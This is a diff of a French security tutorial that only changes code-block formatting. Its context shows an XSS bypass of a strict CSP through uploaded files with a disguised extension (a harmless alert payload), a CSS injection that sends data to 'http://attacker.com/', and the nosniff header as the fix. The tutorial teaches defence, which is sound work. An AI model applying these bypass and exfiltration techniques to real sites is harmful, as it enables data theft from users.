@@ -48,7 +48,6 @@ L'utilisateur peut rechercher un document de la façon suivante :&#x20;
 
 Voici le code source associé :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
 ```php
 <h1>Ne perdez plus jamais vos documents</h1>
 <form action="./" method="GET">
@@ -65,7 +64,6 @@ Voici le code source associé :&#x20;
    }      
  ?>
 ```
-{% endcode %}
 
 Le développeur étant sensibilisé aux vulnérabilités Cross-Site Scripting il décide de se protéger de manière stricte en utilisant les directives Content-Security-Policy (CSP) suivantes :&#x20;
 
@@ -81,7 +79,7 @@ Le développeur valide également la directive avec l'[outil d'évaluation de Go
 
 L'application proposant en effet la possibilité de déposer des fichiers, il décide de durcir son formulaire d'upload :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```php
 // Vérification de la taille du fichier
 if ($_FILES['file']['size'] > 1000000) {
@@ -119,7 +117,7 @@ Un utilisateur malicieux découvre la possibilité d'une XSS au niveau du param�
 
 L'attaquant tente alors d'uploader un fichier de type Javascript `xss.js` puis de l'appeler directement via la paramètre `src` de la balise `<script></script>` :
 
-{% code title="xss.js" overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```javascript
 alert("XSS dans fichier uploadé");
 ```
@@ -133,7 +131,7 @@ Mais le durcissement de la fonctionnalité par le développeur l'en empêche :&#
 
 L'attaquant ayant déjà réussi à uploader avec succès un fichier texte simple, il effectue à nouveau son attaque mais en intégrant la payload XSS dans un fichier ayant l'extension `txt` :&#x20;
 
-{% code title="xss.txt" overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```javascript
 alert("XSS dans fichier uploadé");
 ```
@@ -187,7 +185,7 @@ En revanche, faire passer un fichier Javascript pour une image ne fonctionnera p
 
 Le développeur, étant maintenant au courant de la vulnérabilité permettant d'exploiter l'injection XSS a décidé de bannir complètement l'utilisation de Javascript. La politique CSP devient alors la suivante :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```csp
 Content-Security-Policy: default-src 'self'; script-src 'none'; img-src *; style-src 'self' ; font-src 'self'; frame-ancestors 'none'; object-src 'none';
 ```
@@ -203,7 +201,7 @@ Et l'injection ne semble en effet plus possible :&#x20;
 
 Comme déjà évoqué dans plusieurs articles, l'injection CSS peut permettre de récupérer des informations grâce à l'utilisation des [sélecteurs](../../2022/novembre/les-injections-css-attribute-selector.md), par exemple. L'injection va se faire grâce à la balise `<link>` . L'attaquant va devoir uploader un fichier CSS qui aura une extension autre que `css`, car interdite par l'application :
 
-{% code title="css.txt" overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```css
 input {
   background-image:url(http://attacker.com/);
@@ -286,7 +284,7 @@ Bloque une requête si la destination de la requête est :
 
 Le développeur ayant maintenant connaissance de cet entête de sécurité, il décide d'appliquer cette bonne pratique et modifie la configuration de son serveur en conséquence. Par exemple pour Nginx :&#x20;
 
-{% code title="Fichier de configuration Nginx" overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```nginx
 add_header X-Content-Type-Options "nosniff";
 ```
